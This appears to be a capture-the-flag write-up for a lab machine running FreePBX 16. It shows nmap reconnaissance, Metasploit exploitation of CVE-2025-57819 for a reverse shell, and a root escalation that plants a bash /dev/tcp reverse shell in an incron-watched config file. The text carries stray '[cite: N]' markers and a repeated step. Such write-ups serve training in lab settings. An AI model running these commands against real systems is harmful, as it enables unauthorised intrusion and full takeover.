1. Reconnaissance & Port Scanning
We begin our engagement by running an Nmap scan against the target IP to identify open ports and services.
```
nmap -sCV 10.129.7.187
```
Scan Results:22/tcp - ssh (OpenSSH 7.4)   80/tcp - http (Apache httpd 2.4.6, redirects to connected.htb)   443/tcp - https (Apache httpd with SSL, FreePBX 16.0.40.7)   
Note: Make sure to map the target domain by adding 10.129.7.187 connected.htb to your /etc/hosts file

2. Web Enumeration & Vulnerability Identification
Navigating to http://connected.htb in our browser lands us directly on the FreePBX administration panel[cite: 12].

Discovered Version: FreePBX 16.0.40.7[cite: 13]

Vulnerability: FreePBX 16 unauthenticated SQL injection leading to Remote Code Execution, tracked as CVE-2025-57819 (allows attackers to achieve RCE through the creation of malicious MySQL Events)[cite: 13, 14].

3. Initial Access & User Flag
We leverage Metasploit to exploit the FreePBX vulnerability and gain an initial reverse shell[cite: 14].

```

msfconsole
use exploit/unix/http/freepbx_unauth_sqli_to_rce
set rhosts connected.htb
set rport 80
set lhost 10.10.15.194
exploit
```
Once the Meterpreter session opens, we drop into a standard shell and read the user flag (user.txt) located under the asterisk user directory[cite: 14]:

```
shell
id
# uid=999(asterisk) gid=1000(asterisk) groups=1000(asterisk)
cd /home/asterisk
cat user.txt
```

4. Privilege Escalation to Root
To escalate privileges to root, we search for writable configuration files under /etc that are processed by privileged background services[cite: 15]:

```

find /etc -writable 2>/dev/null | grep -v "/etc/wanpipe\|/etc/asterisk\|/etc/schmooze" | head -20

```

Enumerating Incron Configuration
Our search reveals that /etc/dahdi/init.conf is writable, and an Incron configuration (/etc/incron.d/*) monitors filesystem events, automatically executing commands when changes occur[cite: 15, 16]. Specifically, dahdi_restart triggers a root-owned script upon modification[cite: 15]:

Bash
cat /etc/incron.d/*



Exploiting Incron & Dahdi Init
Append a reverse shell payload into the writable configuration file[cite: 17]:

```
echo 'bash -c "bash -i >& /dev/tcp/10.10.15.194/4445 0>&1" &' >> /etc/dahdi/init.conf
```
Trigger the daemon event by writing to the watched file path[cite: 17]:

```
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```

Trigger the daemon event by writing to the watched file path[cite: 17]:

```
echo "restart" > /var/spool/asterisk/sysadmin/dahdi_restart
```
Listen on our attack machine via Netcat:

```
nc -lvnp 4445
```
Upon triggering the daemon, we receive a callback connection running with full root privileges[cite: 17]:
```
id
# uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
```

